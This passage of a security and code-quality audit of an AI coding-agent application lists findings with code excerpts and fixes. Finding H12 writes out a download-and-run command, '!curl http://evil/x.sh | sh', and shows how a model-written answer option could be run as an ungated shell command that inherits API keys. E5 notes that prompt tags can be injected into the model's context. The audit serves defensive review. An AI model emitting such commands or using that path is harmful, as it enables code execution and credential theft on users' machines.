**M15. ✓ The build ships a disabled hardcoded third-party gateway.**
`node/codeMindAgentEngineMain.ts:300-313`:
```ts
const HARDCODE_ENABLED: boolean = false;
const HARDCODE_BASE_URL = 'https://api.hcnsec.cn';
const HARDCODE_API_KEY = '';          // "Redacted before push…"
const HARDCODE_MODEL = 'kat-coder-pro-v2.5';
```
with four live call sites (`:1056-1057`, `:1281`, `:1350`, `:1364`) that would force base URL,
key and model for all traffic if the flag were flipped.

**In fairness to the author:** it is clearly labelled `TEMPORARY DEV HARDCODE — remove before
shipping`, it is disabled, and the key is empty — so this is latent, not active. But it is
bundled into the shipped renderer, and an external reader (marker, reviewer, future
contributor) will read "hardcoded third-party endpoint + key variable" as a backdoor. Delete
the block and its four call sites rather than leaving a one-boolean switch in shipped source.
Note the asymmetry worth fixing: this key *was* redacted before pushing, while the OpenRouter
key at `models.ts:107` (C1) was not — the discipline was applied in one place and missed in
the other.

### Additional LOW

**B1. ✓ Two near-duplicate service interfaces can drift.**
`common/codeMindAgentEngineService.ts:541-747` declares the shared contract;
`electron-sandbox/codeMindAgentEngineService.ts:42-81` re-declares the worker-side shape with
a different signature (takes `apiKey` args, no cancellation token).
**B2.** No protocol version or negotiation — a renderer/worker mismatch is tolerated only
because the control methods are optional-chained (`:1763-1770`), while
`queryStream`/`cancelQuery`/`respondToPermission` assume the current shape.
**B3.** The worker-side `ProxyChannel.fromService(service, new DisposableStore())`
(`node/…Main.ts:3513`) is never disposed, so `service.dispose()` never runs and pending turns
are not rejected on shutdown.
**B4.** `_rejectPending` (`:3469-3474`) clears `_pendingPermissions` without resolving or
rejecting the stored promises — those hang (teardown-only).
**B5.** A permission prompt left unanswered when a turn ends normally is never removed: the
promise, `input` and `scopeUpdates` are retained and the SDK's `canUseTool` never settles.
**B6.** No overall turn timeout; only control sessions are bounded (`_withTimeout`, `:1897`).
**B7.** Cancellation surfaces two different shapes depending on the race: `cancelQuery`
rejects with `Error('Request cancelled')` (`:1652`) while `_runStream`'s abort catch resolves
quietly (`:1571-1574`).
**B8.** One-shot timers left to fire: the orchestration 4 s race (`:888`) and the 800 ms
retrieval race (`:963`) are not cleared when the winner resolves first.
**B9.** `_redact`'s token rule is `sk-[A-Za-z0-9_-]{8,}` (`:3429-3440`) — covers `sk-ant-`/
`sk-or-`, but not a gateway key with no `sk-` prefix.

### Verified sound (independently confirmed)

The API key is read only from secret storage, crosses IPC as a call argument, and never
reaches globalState, config or the webview; the SDK environment is a **copy** of `process.env`
(`:1282`), so `process.env` is not mutated; there is no `console.*` in any of the four files;
`_trace` is gated on `CODEMIND_ENGINE_LOG` and its callers pass explicit field lists that
exclude `env`; tool failure is distinguishable from turn failure (`tool_result.isError`);
the renderer's cancellation listener is disposed in `finally`; bounded structures confirmed
(`_checkpoints` 100/project, `_perfHistory` 20, `_withTimeout` clears its timer,
`_spawnCapture` guards double-settle); the ProxyChannel thenable pitfall is correctly worked
around via the `{ service }` holder.

---

## Appendix C — Part 2 orchestration: own-review additions

I covered the remaining Part 2 modules directly (`segmentFilter.ts`, `retrievalRequest.ts`,
`editorState.ts`, `learningLoop.ts`). `segmentQueue.ts`, `projectIdentity.ts` and
`projectRegistry.ts` are in the main body above.

### M16. PII redaction does not catch the secrets this project actually uses

`node/orchestration/segmentFilter.ts:95-102` applies exactly four patterns, against
`RE_EMAIL`, `RE_BEARER`, `RE_PASSWORD` and `RE_PEM` (lines 30, 37, 43, 49):

```ts
return text
	.replace(RE_PEM, '[REDACTED]')       // PEM first: multi-line, must run before whitespace collapse
	.replace(RE_EMAIL, '[REDACTED]')
	.replace(RE_BEARER, 'bearer [REDACTED]')
	.replace(RE_PASSWORD, 'password=[REDACTED]');
```

Ordering is right (PEM before the others, and `segmentQueue.ts:284-285` correctly redacts
*before* normalising, so multi-line PEM survives to be matched). The gaps:

- **`RE_PASSWORD` is anchored on the literal word `password`** (`/password\s*[:=]\s*\S+/gi`).
  `api_key`, `apiKey`, `token`, `secret`, `auth`, `client_secret` are not matched at all.
- **`RE_BEARER` requires a `bearer ` prefix**, so a bare key is untouched.
- **The project's own key formats pass through**: `sk-ant-…` and `sk-or-v1-…` are not redacted
  unless preceded by `bearer `. The Anthropic and OpenRouter key shapes this codebase is built
  around are exactly the ones most likely to appear in a transcript, and they are not covered.
- **A quoted password containing spaces leaks its tail**: `\S+` stops at the first space, so
  `password: "correct horse battery staple"` becomes `password=[REDACTED] horse battery staple"`.

The file's header comment is honest that *semantic* PII (names, phones, addresses) is deferred —
but an API key is not semantic PII, it is a secret, and the comment states the goal as catching
"the most common accidental secret leaks in conversation text". By that standard `api_key:
sk-ant-…` is the single most likely leak and it is missed. Meanwhile `sink.ts:20` describes the
input as "already normalized, **PII-redacted** conversation segments", which overstates the
guarantee a reader would infer.

Latent today, because nothing is persisted (H5) — but it becomes **HIGH** the moment a real
write path lands, since these segments are also what gets injected back into prompts.

**Fix:** add `api[_-]?key|token|secret|auth` to the assignment pattern, add a
`sk-[A-Za-z0-9_-]{16,}` bare-token rule, and let the password pattern reach a quoted value
(`\S+` → `("([^"]*)"|'([^']*)'|\S+)`). Say the real scope in `sink.ts` and the docs.

### M17. The learning loop's most interesting path is unreachable

`node/orchestration/learningLoop.ts:73-108` — `triggerLearningLoop` is a priority chain where
**every branch `return`s**, so the first match wins:

1. `turnCount === 1` → project-scope backfill
2. `result?.total_cost_usd > 0.01` → project-scope backfill
3. `turnCount % 10 === 0` → project-scope backfill
4. otherwise → `detectRepoChanges(tools)` → dependency/structure-scope backfill

Branch 2 fires whenever a turn costs more than **one cent**, which is nearly every real turn
with a non-trivial model. So branch 3 and — more importantly — branch 4 are effectively dead in
normal operation: the dependency-file and structure-change detection (lines 14-71), the only
part of this module that inspects anything, almost never runs. The `0.01` is a magic number
with no comment or justification.

And all four branches end in `sink.scheduleBackfill?.(...)`; the production sink's
implementation (`node/ppb/sink.ts:47-53`) only logs a line. So the "learning loop" neither
learns nor schedules — it is a no-op dispatcher wrapped around a reachability bug.

### B10. Shared types are not merely duplicated — two of them are **incompatible**

The two `TurnSummary` declarations have different shapes, not identical ones:
`retrievalRequest.ts:6-9` defines `{ role: 'user'|'assistant'; content: string }`, while
`orchestration/types.ts:213-216` defines `{ userPromptFirstLine; assistantResponseFirstLine; turnIndex }`.
The engine bridges them with a double cast
(`this._buildSessionHistory() as unknown as Parameters<typeof buildRetrievalRequest>[3]`), and the
producer always returns `[]`, so `recentTurns: sessionHistory.slice(-3)` is permanently empty —
the field is read but never populated. See M21. Alongside the two `ISegmentSink` declarations
(N3), that is four shared types declared more than once, two of them incompatible.

### B11. `executeRetrieval`'s timeout timer is never cleared

`retrievalRequest.ts:68-71` races the retriever against a `setTimeout` that rejects after
800 ms. When the retriever wins, the timer is still pending, so a Node process (and the test
runner) is kept alive for up to 800 ms per call. No unhandled rejection results — `Promise.race`
already attached a handler — so this is a lingering-timer smell, not a crash.

Also in this cluster: `buildRetrievalRequest(request: any, …)`, `buildEditorState(request: any, …)`
and `detectRepoChanges(tools: any[])` are all `any`-typed, and `editorState.ts:29` ships
`workspaceConfig: {}` as a documented placeholder. `shouldIngest` and `normalise` are correct
and match their comments.

---

## Appendix D — Session-state slice: delegated deep-dive, merged

The session-state slice completed and covers `segmentQueue`, `segmentFilter`,
`retrievalRequest`, `projectIdentity`, `projectRegistry`, `conflictTransport` and `editorState`.
It confirmed the queue-drain and registry findings in this report and adds the following.
Every ✓ item I re-verified in the source myself.

### Additional HIGH

**H10. ✓ Every successful turn emits a phantom "timeout / failed" event.**
`node/codeMindAgentEngineMain.ts:886-899` — the 4 s degradation timer inside the orchestration
race:
```ts
new Promise<any>((resolve) =>
	setTimeout(() => {
		this._onEvent.fire({
			queryId,
			event: {
				type: 'orchestration_progress',
				phase: 'timeout',
				status: 'failed',
				message: 'Context preparation timed out — proceeding with original prompt',
			} as any,
		});
		resolve({ enrichedPrompt: request.prompt, ... });
	}, 4000)
```
The `setTimeout` reference is never stored, so it **cannot** be cleared — there is no handle to
clear. `Promise.race` takes the first settle, but the callback's side effect (`_onEvent.fire`)
runs regardless of who won. So on every normal turn, where `orchestrate()` returns well under
4 s, a `phase: 'timeout', status: 'failed'` progress event is fired four seconds later onto the
same channel the renderer forwards to the Orchestration panel. The panel shows a failed context
preparation on turns that succeeded, and it pins one timer per turn for 4 s.

**H11. ✓ Cross-project attribution — a turn's text can be stamped with another project's id.**
`_currentProjectId` and `_currentIntent` are **single-slot instance fields**
(`:779-780`), written once per turn at `:941` (`this._currentProjectId = idInfo.projectId`),
while the same class explicitly supports overlapping queries (its own comment notes a companion
reaction, a `/btw` side question, and a queued prompt starting before the previous turn's stream
closed). Thirteen sites then read the *current* value rather than this turn's:

| Line | Use |
|---|---|
| `:759` | `buildEditorState({ cwd: this._currentProjectId })` |
| `:950-966` | preferences + `formatInjectionBlock` |
| `:973` | injection audit event |
| `:1075` | `enqueue({ projectId: this._currentProjectId, turnId: queryId, role: 'user' })` |
| `:1285` | `env.CODEMIND_CURRENT_PROJECT_ID` (what the `ProjectBrain` tool reads) |
| `:3252` | `enqueue({ …, role: 'assistant' })` |
| `:3275` | `triggerLearningLoop(…, this._currentProjectId, …)` |

If two turns in flight resolve different cwds — a folder switch with a turn running, or a
`/btw` after a workspace change — turn A's prompt text, result text and tool activity are
attributed to turn B's project and land in B's knowledge graph. `QueryState.projectKey`
already exists as the per-query container; it is simply not used for this. This is the
cross-project leak the queue counts elsewhere (`crossProjectLeaks`), occurring on the
write path where no counter is watching.

### Additional MEDIUM

**M18. ✓ `getEditorState()` returns a project UUID as the working directory.**
`:759` — `buildEditorState({ cwd: this._currentProjectId } as any, …)`. `buildEditorState`
does `const cwd = request.cwd ?? process.cwd()` (`editorState.ts:20`), so the value is the
project id, and `openFiles` is always `[]`. The `as any` is what lets it type-check.

**M19. ✓ An empty `cwd` mints a fresh project id every call, growing the registry forever.**
`:940` — `getOrCreateProject(request.cwd ?? process.cwd())`. `'' ?? x` evaluates to `''`, so an
empty string is passed through. In `projectIdentity.ts`: `realpath('')` throws and the catch
assigns `resolvedCwd = cwd` (`''`, line 208); `gitRoot('')` fails so `repoPath = '' || '' = ''`
(line 213); then line 257 — `const signal = repoPath || resolvedCwd || uuidv4();` — falls through
to `uuidv4()`, 16 `Math.random()` bytes (line 186). Each such turn registers a **new** projectId
and awaits a full-file `persist()`. Nothing prunes (`deleteProject` is test-only), so
`projects.json` gains one dead record per such turn, indefinitely. Note `queryStream` treats the
same input as falsy (`request.cwd || homedir()`), so the two call sites disagree about `''`.
*Unconfirmed from this checkout whether the renderer can actually send `cwd: ''` — if it cannot,
this needs a future caller to trigger, but the `??` guard is still wrong.*

**M20. ✓ Nothing flushes the queue on shutdown, so queued segments are silently lost.**
`flush()` (`segmentQueue.ts:222`) has **zero production call sites** — grep finds the definition
only, everything else is tests. Nothing tears PPB down: the service is a `Disposable` but its
registration block only calls `setSink` (`:710-740`). On window reload or quit the utility
process dies with up to 256 buffered segments discarded, with no flush, no event and no counter.

**M21. ✓ `recentTurns` is read but never populated.** `_buildSessionHistory()` always returns
`[]` (`:805-807`), so `sessionHistory.slice(-3)` (`retrievalRequest.ts:56`) is permanently empty
— and because the two `TurnSummary` shapes are incompatible (see B10), implementing the producer
for real would supply objects with no `role`/`content` and silently break the consumer.

### Additional LOW

**D1. ✓ `p95PipelineMs` is the maximum, not the 95th percentile.**
`codeMindOrchestrationEngine.ts:130` — `sorted[Math.floor(sorted.length * 0.95)]`. With the
20-sample cap, `floor(20 * 0.95) = 19`, which is the last index = the max. Missing `- 1`
(or `Math.ceil(0.95 * n) - 1`), so the reported p95 is the worst case.
**D2. ✓ `executeRetrieval` is dead in production.** Only tests call it; the engine
re-implements the same 800 ms race inline (`:963`) with a duplicated timer, so the tested
function and the shipped one are two different code paths.
**D3.** `_sessionTurnCount` (`:779`) is never reset per project or on a project switch, yet it is
passed as the per-project `turnCount` to `triggerLearningLoop` (`:3275`) and used to derive
`isFollowUp` (`:870`).
**D4.** Silent-failure chain: a throwing `getOrCreateProject` sets `_currentProjectId = undefined`
in a bare catch (`:942-944`), after which `enqueue`'s second guard returns early — the entire PPB
pipeline goes off for the session with no event and no log.
**D5.** The drop policy is invisible: ring evictions only bump `_stats.overflows` (no log, no
renderer surface) and sink failures are counted as `dropped` with no retry and no backpressure.
**D6.** No per-segment size cap — `enqueue` normalises but never truncates `text`, and one drain
hands the entire ring to the sink as a single batch, so a batch is bounded in count (256) but not
in bytes.
**D7.** `cancelQuery` never touches the queue, so a cancelled turn's user prompt is still
ingested while its assistant half never is (`_finalize` unreachable) — a cancelled turn is split
across the brain.
**D8.** Git work sits on the per-turn path outside the timeout: `getOrCreateProject` runs after
the 4 s race (`:940`) and `resolveProjectIdentity` serially awaits up to four `git` spawns capped
at 500 ms each, i.e. up to ~2 s on the first turn of each project.
**D9.** `_cwdCache` is keyed on the raw `request.cwd` while records store `realpath`/git-root
output, so on Windows (separator and case differences) the reverse lookup misses and identity is
recomputed every turn.
**D10.** `normaliseRemoteUrl` lowercases the whole URL (`projectIdentity.ts:128`) — right for
GitHub, wrong for case-sensitive self-hosted GitLab/Gitea.
**D11.** Identity is the git root, so a folder opened at `packages/web` shares the repo's id and
reports `workspaceName = 'proj'`, while the segment producer stamps
`basename(request.cwd)` — two different `workspaceName` values for one project.
**D12.** `conflictTransport.ts` is a type-only file referenced nowhere (10 lines).

### Verified sound (independently confirmed)

`segmentFilter`'s redaction ordering and documented scope; `shouldIngest`'s bare-path rejection;
the ring's evict-oldest policy and counter; `filterToProject`'s empty-id guard; UUIDv5 version
and variant bit handling plus remote-URL canonicalisation; `injectionBlock`'s budget break;
`learningLoop`'s never-throw wrapper; `exec`'s 500 ms timeout does kill the git child; no path
traversal or injection in `gitExec`'s fixed command strings.

---

## Appendix E — Webview UI slice: delegated deep-dive, merged

The webview slice completed (57 tool calls, ~25 min) and covered all six `browser/media/*.js`
files and the CSS. It independently reached the same conclusion as my own pass on
`consensus.js` (H1/H2 above — two separate reviewers, same lines), and adds the following.
All ✓ items re-verified by me in source.

### Additional HIGH

**H12. ✓ A model-authored option label is executed as a shell command on click.**
This is the most serious finding in the report. The composer's `!` mode routes on the **first
character** of the submitted text (`browser/media/agent.js:1362-1372`):

```js
function dispatchPrompt(entry) {
	const mode = INPUT_MODES[entry.text.charAt(0)];
	if (mode) {
		const body = entry.text.slice(1).trim();
		if (!body) { return false; }
		vscode.postMessage(mode.id === 'shell'
			? { type: 'runShell', payload: { command: body } }
			: { type: 'addMemory', payload: { text: body } });
		return false;
	}
	vscode.postMessage({ type: 'sendMessage', payload: entry });
```

That is correct for a user who typed `!`. The bug is that **`AskUserQuestion` answers take the
same route with text the model wrote.** `askOptionLabel` (`agent.js:3573-3576`) reads
`option.label` straight out of the tool input, and for a single-question card
`askAnswerText` returns the chosen label **unprefixed** (`:3602-3613`):

```js
const answer = chosen.join(', ');
if (questions.length === 1) { return answer; }     // no header prefix
...
return `${label.replace(/[:?]\s*$/, '')}: ${answer}`;   // multi-question IS prefixed
```

`submitAskAnswer` (`:3702-3723`) then hands `{ text, ... }` to `dispatchPrompt`. So a model that
emits one question with an option labelled `!curl http://evil/x.sh | sh` gets that command run
the moment the user clicks the option — and for a *multi*-question card the prefix
(`Header: !cmd`) defeats the first-character check, which is why only the single-question case
is exploitable.

Downstream there is **no permission gate at any point**: `runShell` → `codeMindAgentViewPane.ts:1040`
→ `_runShellInput` (`:1934`) → `execShell({ command: line, ... })` (`:1946`) →
`electron-sandbox/codeMindAgentEngineService.ts:389` → `node/codeMindAgentEngineMain.ts:2208` →
`_spawnCapture(request.command, undefined, true, …)` → `spawn(command, [], { shell: true, env: process.env })`
(`:2221-2225`). Verbatim execution through the platform shell, contrasting with the SDK tool path
which does go through `canUseTool`. Note the code's own comment at `:2205-2206` states its safety
assumption — *"Only the composer's `!` mode calls this, with a line the user typed"* — which the
ask-answer path silently violates. Combine with M13 (`env: process.env`, so the shell inherits the
Anthropic key) and this is a one-click path from model output to code execution with credentials.

**Fix:** require the `!` prefix to have been typed by the user — e.g. tag the entry with its
origin (`{ text, origin: 'composer' | 'askAnswer' }`) and have `dispatchPrompt` only honour
`INPUT_MODES` when `origin === 'composer'`. Prefixing ask answers unconditionally would also fix it.

### Additional MEDIUM

**M22. ✓ No live region on the transcript or the status line.** The only `aria-live` in the entire
media tree is the provider fetch hint (`panels.js:1245`). `#messages`
(`codeMindAgentViewPane.ts:872`) has no `role="log"`/`aria-live`/`aria-busy`, and `#statusText`
(`:850`), which carries "Thinking…" and error text, has none — so streamed output and turn status
are never announced to assistive tech.

**M23. ✓ Keyboard-unreachable clickable rows.** `.panel-row-openable` (`panels.js:523`),
`.history-row` (`:678`) and the slash/mention items (`agent.js:2144`, `:2270`, the latter two
bound to `mousedown` only) are plain divs with no `tabindex`, no `role="button"` and no `keydown`
handler. The slash/mention menus are mitigated because the composer keeps focus and its
`handleKeydown` (`:1160-1177`) handles arrows/Enter/Tab/Esc; the panel and history rows are
genuinely mouse-only.

**M24. ✓ A document click listener is stacked on every model-list render.** `consensus.js:77-81`
adds `document.addEventListener('click', …)` inside `renderModelCheckboxes`, which re-runs on
every `models_loaded` message. Each render leaks another document-level listener that is never
removed.

### Additional LOW

**E1. ✓ `setApiKeyHint` is dead** — defined at `panels.js:1264` and never called; its target
element id `settingsApiKeyHint` is never written (whole-tree occurrence count = 1).
**E2. ✓ The permission dialog focuses the *allow* button** — `agent.js:4465`
`setTimeout(() => permAllow.focus(), 50)`, so a reflexive Enter approves a tool use. Deny exists
and Escape works (`:224-228`), so the dialog is dismissible — but the default focus is permissive.
**E3.** `consensus.js:195`'s non-HTML branch escapes only `<` and `>` (no `& " '`) — not
exploitable in a text context, but a weaker rule than the helper three lines above it.
**E4.** `agent.js:3055` interpolates `msg.type` unescaped into a `class` attribute. Today `type`
is only ever set by the webview itself, so this is a smell, not a bug.
**E5.** `_runShellInput` interpolates the command into pseudo-XML model context
(`<local-command-stdout command="${line}" …>`), so a command containing `"` and `>` can inject
apparent framework tags into the next prompt — self-injection, not cross-user.
**E6.** `streamScratch` is never released per turn (`agent.js:2629` sets an entry per stream; only
`clear()` on new session / `Ctrl+L` / history replace / reset at `:2627, 829, 949, 4361`), so
per-turn thinking text and tool maps accumulate for the session. The rendered DOM is windowed
(`WINDOW_THRESHOLD=80` / `WINDOW_INITIAL=40`, `:2798-2834`) so nodes are bounded — the backing
array is not.
**E7.** `showImagePreview` (`agent.js:1880-1896`) appends a popup to `document.body` and relies on
the chip's `mouseleave`; `renderAttachments` replaces `attachmentsHost.innerHTML`, so a re-render
while hovering drops the chip and orphans the popup until the next preview.
**E8.** `escapeHtml` is copy-pasted four times (`agent.js:4626`, `consensus.js:19`,
`panels.js:1662`, `trace.js:21`) even though `agent.js` already publishes a shared namespace
(`window.CodeMindAgent`, `:4653`). E3 and the H1/H2 divergence are the cost of the copies.

### Verified sound (independently confirmed — note the positives)

- **The theme claim holds.** Every hardcoded colour is benign: `agent.css`'s 7 hex + 4 `rgb()`
  matches are all inside comments (`:54`, `:258`); `trace.css`'s 7 hex values are `var()`
  fallbacks (`:231-233`, `:248-250`, `:287`), the one acceptable form; the "named colour" hits are
  comment words or object **keys** whose values are tokens (`agent.js:2386-2393`), and the
  `&#039;` matches are regex artifacts in the escape helpers. *The slice did not independently
  re-verify the "nothing below 3.0:1" contrast sweep — the token discipline it rests on is intact.*
- **No `document.write`, no `eval`, no `new Function`, no string-argument timers, no `srcdoc`,
  and no inline `on*=` event-handler attributes anywhere** in the media tree or the three HTML
  templates.
- **`renderMarkdown` escapes first** (`let html = escapeHtml(text)`, `agent.js:4077`), stashes
  code fences before inline passes, and `highlightCode` re-escapes every emitted token
  (`:4277-4296`, amp-last ordering correct).
- **Link hrefs are scheme-allowlisted** (`SAFE_LINK_SCHEME = /^(?:https?:\/\/|mailto:)/i`,
  `agent.js:64`, applied at `:4106` and to search hits at `:3481`), so no `javascript:` or
  `vscode:` anchor is reachable from model output.
- `panels.js:1613` inserts `${spec.body}` raw in `showSheet`, but all six call sites
  (`:462, 607, 705, 1166/1189, 1578, 1703`) wrap their dynamic values in `escapeHtml`; and
  `:1240`/`:1282` (provider/endpoint error strings) use `textContent`, not `innerHTML`.
- Tool output reaches the DOM through `resultBlock`/`clipBlock`/`clippedCode`
  (`agent.js:3750-3782`) → `escapeHtml`/`renderMarkdown`; paths, branch names, attachment names,
  history topics and skill/MCP/provider names are all escaped (`:3197`, `1843`, `668`, `671`,
  `510`, `513`, `1537`).
- Animation/interval cleanup is correct: `renderFrame`/`cancelAnimationFrame` (`:2816-2823`),
  `bgTicker` interval cleared on close (`:1600-1607`), aristotle's rAF loop has `shouldRun()` +
  `stopLoop()` + `panelVisible` (`aristotle.js:220-250`); `enhanceClips`/`ensurePanelHost` guard
  against double-wiring with `dataset.wired`.
- No dead CSS rules of consequence: the classes emitted with no rule (`is-run`, `mode-menu-label`,
  `panel-close`, `settings-source`, `thinking-label`) are markup/`querySelector` hooks, and
  `consensus.css`'s `.main-content`/`.brand`/`.event-log` are rendered by
  `codeMindConsensusPanel.ts:359+`.

*Not verified:* the "nothing below 3.0:1" contrast claim, and whether the renderer's
`codeMindConsensusPanel.ts` HTML template is itself escaped end to end (only its `${spec.body}`
composition was checked).

---

## Appendix F — Intent / context / headroom cluster: own review

This is the last substantial CodeMind-owned area (~2000 lines, 14 files). I reviewed
`deterministicIntent.ts`, `contextOptimizer.ts`, `localClassifier.ts`, `intentModel.ts`,
`headroomLayer.ts`, `retrievalRequest.ts`, `editorState.ts` and `learningLoop.ts` directly.
Still unread: `intentDetector.ts`, `intentFusion.ts`, `intentBenchmark.ts`,
`contextAggregator.ts`, `injectionBlock.ts`, `toolSelector.ts`, `capabilities.ts`,
`traceCollector.ts`, `textNormalize.ts`.

### Additional HIGH

**H13. ✓ The context optimizer deletes repeated lines inside file contents, corrupting the
code the model is given.** `node/orchestration/contextOptimizer.ts:13-25` deduplicates the
serialized context **line-by-line, case-insensitively**:

```ts
function deduplicate(serialized: string): { text: string; removed: number } {
    const lines = serialized.split('\n');
    const seen = new Set<string>();
    ...
    for (const line of lines) {
        const key = line.toLowerCase().trim();
        if (key && seen.has(key)) { removed++; continue; }   // ← any repeat is dropped
        if (key) seen.add(key);
        out.push(line);
    }
```

and `optimizeContext` runs it over the whole serialized string, **file contents included**
(`serialized += '=== FILE: ${f.path} ===\n${f.content}\n'`, lines 62-66 → `deduplicate(serialized)`
at line 78). Blank lines survive (`key === ''` is falsy), but any repeated non-blank line does
not. In code that means `}`, `    }`, `});`, repeated imports, repeated `return …;` — the lines
that carry structure. I ran the function verbatim over an 18-line well-formed TypeScript file:

```
=== lines removed by deduplicate(): 4 ===
export function login(req, res) {
    if (!req.body.email) {
        return res.status(400).json({ error: "email required" });
    }
    const user = db.find(req.body.email);
    if (!user) {
        return res.status(404).json({ error: "not found" });
    return res.json({ ok: true });      ← the if-block's closing brace is gone

export function logout(req, res) {      ← login()'s closing brace is gone; functions merged
```

Four lines are removed and the result is not valid code: braces vanish, two functions merge, and
`logout` loses its body entirely. This is the context the "Context Optimization Engine"
exists to prepare, so the feature is currently degrading its own input on any file with repeated
lines — which is nearly every file. Severity: HIGH for correctness of the primary context path;
the model receives malformed source and a plausible downstream failure is a confidently wrong
answer about code structure.

**Fix:** dedupe sections, not lines — or at minimum skip fenced/file-content regions and only
drop whole duplicate *blocks*. A line-level pass over source is unsafe by construction.

### Additional MEDIUM

**M25. ✓ The local intent model has no held-out test set, and reports training accuracy of 1.0.**
`intentModel.ts` is auto-generated (150 KB of embedded numbers) and carries its own provenance:

```ts
trainedAt: "2026-08-20T10:04:01.844Z",
numCases: 150,
trainAccuracy: 1,          // 100% on the corpus it was fitted on
cvAccuracy: 0.686667,      // 5-fold CV
triggerBelowScore: 2.5,
acceptProbability: 0.3,
```

`node/tools/trainIntentModel.mjs` (22.3 KB, committed — the model *is* reproducible, which is a
credit) states its own method at line 11: *"Reads intentBenchmark.ts (the ground truth), fits a
TF-IDF + multinomial …"*, and assigns `const cases = INTENT_BENCHMARK;` (line 290). So the same
150 cases are the training corpus, the hyperparameter-tuning set (`triggerBelowScore`,
`acceptProbability` are documented as "TUNED on the benchmark"), **and** the reported evaluation.
There is no held-out split anywhere, so there is no unbiased number in this file at all.

To be fair to the author, the code handles this better than most: `cvAccuracy` is explicitly
commented "the honest generalization estimate", which is the right instinct. But two things a
reviewer will stop on:

- **`trainAccuracy: 1`** with 150 cases across 12 classes and a vocabulary of several hundred
  terms is a textbook memorisation signature — 100% train against 68.7% CV. The honest headline
  is 68.7% on ~12.5 examples per class, and it should be stated that way.
- **`acceptProbability: 0.3`** means the layer overrides the deterministic result whenever its top
  softmax clears 30% — against an 8.3% uniform baseline across 12 classes. The second stage can
  therefore replace a correct first-stage answer with a ~31%-confident one, and the threshold was
  chosen on the same corpus used to report the score.

**M26. ✓ `compressSuffix` is dead code from a superseded design — and the trace's savings figures
do not come from CodeMind compressing anything.** `headroomLayer.compressSuffix` — the in-process
suffix compressor — is **called only from `test/headroomLayer.test.ts`**; no production caller
exists. That is not an oversight: the engine documents the replacement at
`codeMindAgentEngineMain.ts:986-993` — *"The old design compressed only the tiny intent-hint
suffix in-process, which was always below the compression threshold … the proxy compresses the
REAL request payload"* — and at `:1017`, *"The suffix is no longer compressed in-process (the
proxy does the real work)"*. The live mechanism is PROXY-IN-PATH: the model `baseUrl` points at
the local proxy, falling back to the gateway (`:622-623`). So compression does happen when the
proxy runs; the honest finding is narrower than it first appears — `compressSuffix`, its
thresholds (`COMPRESS_THRESHOLD_LIGHT/AGGRESSIVE`), `decideMode` and the light-mode
`=== SECTION ===` preservation are all unused surface with a passing test suite behind them.

The trace-only caveat is worth stating: the Headroom card's "tokens saved" is computed from the
**proxy's own cumulative counters** via `fetchProxyStats` (`:1000` before, `:3335` after), and the
"before" snapshot is gated on `this._devModeEnabled` (`:1000`) — so outside dev mode `turn.before`
is null and no per-turn figure is produced. The panel's own copy is accurate about this
("Enable 🐛 dev mode … then send a message").

### Additional LOW

**F1.** `classifyDeterministic` (`deterministicIntent.ts:199-212`) returns
`confidence: Math.min(0.98, Math.max(0.3, s.topScore / 6))` — an arbitrary rescaling of a raw
unbounded weighted sum, with a magic divisor of 6. The same file's header states the opposite
intent: *"Nothing here returns a 'confidence' — `topScore`/`secondScore` are raw weighted sums
(unbounded), never probabilities."* The disclaimer and the function disagree.
**F2.** Unit confusion, third instance: `estimatedTokens` is `Math.ceil(len / 4)` — a
character-derived estimate (`contextOptimizer.ts:86`, `headroomLayer.ts:51`) — while real token
counts from `usage` are displayed elsewhere under the same word.
**F3.** `fastPathClassify` maps any `/`-prefixed prompt to `TERMINAL_EXECUTION` at confidence 1.0
(`deterministicIntent.ts:112-114`), which is semantically wrong for app-level slash commands
(`/model`, `/clear`, `/btw`) and feeds the intent hint shown to the model.
**F4.** Scores are per-pattern, not per-occurrence (`prompt.match(pattern)` is used for its
truthiness only), so a prompt mentioning "bug" ten times scores identically to one mentioning it
once. Defensible, but the header's "weighted-keyword scores" reads as frequency-aware.
**F5.** On a score tie the winner is decided by `INTENT_SIGNALS` declaration order via a stable
sort — deterministic, but undocumented, and it makes `CODE_GENERATION` (declared first) the de
facto tie-breaker. `topIntent` for an all-zero prompt is likewise arbitrary.
**F6.** `analyzeCompound` splits on a bare `\s+and\s+` (`:160`), so "fix the login and error pages"
splits into two clauses; the `MIN_OBJECTIVE_SCORE = 2.5` gate contains the damage, but a pasted
code fragment containing `and` is split too.
**F7.** `compressSuffix(systemPromptSuffix, model, _intent)` ignores `_intent` entirely
(`headroomLayer.ts:106`), so the documented intent-driven compression never varies by intent.
**F8.** `prewarmHeadroom` latches its verdict — `if (_headroomAvailable !== null) return;`
(`:81`) — so a library that fails to resolve once is never retried for the process lifetime; a
proxy installed mid-session is never picked up.
**F9.** `headroomLayer.ts:266` references the "v0.2.0 shape" while `claude-code/package.json:54`
declares `"headroom-ai": "^0.22.4"` — the shape comment is stale.
**F10.** `trimFileContext` (`contextOptimizer.ts:42-45`) truncates any rendered line over 200
chars, matching across `=== ` section headers and non-file text as well as file content.

### Verified sound

- `headroomLayer`'s contract discipline is genuinely good: every network path is bounded by an
  explicit timeout, `pingHeadroomProxy` treats any HTTP response (even a 404) as "something is
  listening" and documents why, `fetchProxyStats` handles both the nested `tokens.input/saved` and
  flat `totalTokens*` shapes with a 1 MB response cap and never throws, and `compressSuffix`
  always resolves — a missing proxy cannot stall a turn. All local-proxy only; no remote endpoint
  appears in the file.
- `localClassifier`'s inference is pure arithmetic (no network, no filesystem), the TF-IDF
  transform matches sklearn's `TfidfVectorizer` defaults as documented, softmax is numerically
  stabilised (max-subtracted), `hasFeatures` correctly reports all-OOV input, and `localModelInfo`
  exposes the model's own honest metadata to the trace.
- `intentModel.ts` is committed, reproducible from a committed trainer, and states its own
  provenance and limitations — the discipline is right even though the evaluation design is not.
- `headroom-ai@^0.22.4` is **committed** in `claude-code/package.json` (present in `HEAD`, working
  tree clean for that file), so unlike the PPB dependencies this one is not a hand-edit — but note
  it is a third-party dependency inside the vendored, licence-less `claude-code/` tree.
- `contextOptimizer`'s `sectionsIncluded` logic correctly reports only sections that serialized
  content (the code documents the earlier empty-array/bookkeeping-key bug it fixed), and
  `pruneByIntent`'s `=== ` split/join round-trips correctly.

*Not verified:* the still-unread files listed at the top of this appendix, and whether
`headroom-ai` performs meaningful compression (that is the proxy's behaviour, outside this repo).

---

## Appendix G — Build / vendored fork / patches / scripts / infra / docs: delegated audit, merged

The build slice completed (51 tool calls, ~32 min) and is the one that answers the question the
original scope turned on. It confirms the failure mode behind H3 and finds a second, worse one.
